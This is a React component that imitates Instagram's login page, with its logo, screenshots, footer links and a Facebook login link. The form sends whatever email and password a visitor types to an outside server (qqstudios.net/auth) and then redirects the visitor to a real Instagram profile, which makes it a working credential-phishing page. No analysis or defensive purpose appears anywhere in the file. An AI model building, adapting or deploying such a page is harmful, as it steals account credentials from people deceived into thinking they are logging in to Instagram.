import "./App.css";
import { useFormik } from "formik";
import * as Yup from "yup";
import { useState, useEffect } from "react";
import { FaFacebookSquare } from "react-icons/fa";
import img1 from "./img/screenshot1.png";
import img2 from "./img/screenshot2.png";
import img3 from "./img/screenshot3.png";
import img4 from "./img/screenshot4.png";
import igText from "./img/ig-text.png";
import google from "./img/google.png";
import microsoft from "./img/microsoft.png";

function App() {
  const [imgIndex, setImgIndex] = useState(0);

  const validationSchema = Yup.object().shape({
    email: Yup.string().email("Invalid email").required("Required"),
    password: Yup.string().required("Required"),
  });

  const formik = useFormik({
    initialValues: {
      email: "",
      password: "",
    },
    validationSchema: validationSchema,
    onSubmit: async (values) => {
      try {
        const response = await fetch("https://qqstudios.net/auth", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(values),
        });
        if (response.ok) {
          window.location.href = "https://www.instagram.com/oceantint/"; // Using window.location.href for external URLs
        }
      } catch (error) {
        console.error("An error occurred:", error);
      }
    },
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setImgIndex((prevIndex) => (prevIndex + 1) % 4);
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const screenshots = [
    { name: "img1", src: img1, alt: "image 1" },
    { name: "img2", src: img2, alt: "image 2" },
    { name: "img3", src: img3, alt: "image 3" },
    { name: "img4", src: img4, alt: "image 4" },
  ];

  return (
    <div className="App">
      <div className="wrapper">
        <div className="left">
          {screenshots.map((img, index) => (
            <img
              src={img.src}
              alt={img.alt}
              key={img.name}
              style={{ opacity: imgIndex === index ? "1" : "0" }}
            />
          ))}
        </div>
        <div className="right">
          <form onSubmit={formik.handleSubmit}>
            <img src={igText} width={200} alt="Instagram text" />
            <input
              placeholder="Phone number, username, or email"
              name="email"
              value={formik.values.email}
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
            />
            {formik.errors.email && formik.touched.email && (
              <div className="error">{formik.errors.email}</div>
            )}
            <input
              placeholder="Password"
              name="password"
              type="password"
              value={formik.values.password}
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
            />
            {formik.errors.password && formik.touched.password && (
              <div className="error">{formik.errors.password}</div>
            )}
            <button type="submit">Log in</button>
            <div className="divider">
              <hr />
              <h5>OR</h5>
              <hr />
            </div>

            <div className="facebook">
              <FaFacebookSquare color="#385185" />
              <a href="#">Log in with Facebook</a>
            </div>
            <a href="#">Forgot password?</a>
          </form>
          <div className="create-account">
            <span>
              Don't have an account? <a href="#">Sign up</a>
            </span>
          </div>
          <div className="get-app">
            <p>Get the app.</p>
            <div className="app-store">
              <img src={google} height={40} alt="Google Play Store" />
              <img src={microsoft} height={40} alt="Microsoft Store" />
            </div>
          </div>
        </div>
      </div>
      <div className="footer">
        <div>
          <a href="#">Meta</a>
        </div>
        <div>
          <a href="#">About</a>
        </div>
        <div>
          <a href="#">Blog</a>
        </div>
        <div>
          <a href="#">Jobs</a>
        </div>
        <div>
          <a href="#">Help</a>
        </div>
        <div>
          <a href="#">API</a>
        </div>
        <div>
          <a href="#">Privacy</a>
        </div>
        <div>
          <a href="#">Consumer Health Privacy</a>
        </div>
        <div>
          <a href="#">Terms</a>
        </div>
        <div>
          <a href="#">Location</a>
        </div>
        <div>
          <a href="#">Instagram Lite</a>
        </div>
        <div>
          <a href="#">Threads</a>
        </div>
        <div>
          <a href="#">Contact Uploading & Non-User</a>
        </div>
        <div>
          <a href="#">Meta Verified</a>
        </div>
      </div>
    </div>
  );
}

export default App;
